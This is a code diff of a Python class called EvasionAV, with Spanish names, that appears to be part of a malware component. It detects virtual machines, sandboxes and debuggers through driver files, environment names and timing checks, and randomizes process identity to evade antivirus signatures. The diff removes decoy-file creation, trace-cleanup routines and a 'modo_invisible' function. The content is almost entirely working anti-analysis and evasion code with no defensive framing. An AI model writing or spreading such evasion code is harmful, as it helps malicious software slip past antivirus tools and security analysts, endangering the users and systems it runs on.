@@ -25,7 +25,6 @@ class EvasionAV:
             self._check_cpu_cores,
             self._check_recent_files
         ]
-        
         sospechoso = 0
         for check in checks:
             try:
@@ -35,11 +34,9 @@ class EvasionAV:
             except:
                 pass
             time.sleep(0.05)
-        
         if sospechoso >= 3:
             self.es_seguro = False
             return False
-        
         return True
     
     def _check_sandbox_files(self):
@@ -56,19 +53,15 @@ class EvasionAV:
             r'C:\\windows\\system32\\drivers\\vboxmouse.sys',
             r'C:\\windows\\system32\\vboxdisp.dll'
         ]
-        
         for file in vm_files:
             if os.path.exists(file):
                 return True
-        
         env_vars = ['VBOX', 'VMWARE', 'VIRTUAL', 'SANDBOX']
         computer_name = os.environ.get('COMPUTERNAME', '').upper()
         username = os.environ.get('USERNAME', '').upper()
-        
         for var in env_vars:
             if var in computer_name or var in username:
                 return True
-        
         return False
     
     def _check_debugger(self):
@@ -76,12 +69,10 @@ class EvasionAV:
             import ctypes
             if ctypes.windll.kernel32.IsDebuggerPresent():
                 return True
-            
             start = time.perf_counter()
             for i in range(10000):
                 _ = i * 2
             elapsed = time.perf_counter() - start
-            
             if elapsed > 0.1:
                 return True
         except:
@@ -95,7 +86,6 @@ class EvasionAV:
             _ = hashlib.sha256(os.urandom(1024)).hexdigest()
             elapsed = time.perf_counter() - start
             operations.append(elapsed)
-        
         avg = sum(operations) / len(operations)
         variance = sum((x - avg) ** 2 for x in operations) / len(operations)
         return variance > 0.01
@@ -163,47 +153,12 @@ class EvasionAV:
         timestamp = datetime.now().strftime('%Y%m%d%H%M%S%f')
         unique_hash = hashlib.sha256(timestamp.encode() + os.urandom(32)).hexdigest()[:16]
         return process_name, timestamp, unique_hash
-    
-    def crear_senuelos(self):
-        try:
-            senuelos = ['readme.txt', 'config.ini', 'settings.dat']
-            for senuelo in senuelos:
-                if not os.path.exists(senuelo):
-                    with open(senuelo, 'w') as f:
-                        f.write(f"# Configuration\\n")
-        except:
-            pass
-    
-    def limpiar_rastros(self):
-        try:
-            senuelos = ['readme.txt', 'config.ini', 'settings.dat']
-            for archivo in senuelos:
-                if os.path.exists(archivo):
-                    try:
-                        os.remove(archivo)
-                    except:
-                        pass
-        except:
-            pass
 
 
 def verificar_seguridad_total():
     evasion = EvasionAV()
-    evasion.crear_senuelos()
     evasion.ofuscar_ejecucion()
-    
     if not evasion.verificar_entorno():
-        evasion.limpiar_rastros()
         return False
-    
     proceso, timestamp, unique_id = evasion.evadir_firmas()
     return True
-
-
-def modo_invisible():
-    evasion = EvasionAV()
-    evasion.crear_senuelos()
-    time.sleep(random.uniform(0.5, 1))
-    resultado = evasion.verificar_entorno()
-    evasion.limpiar_rastros()
-    return resultado
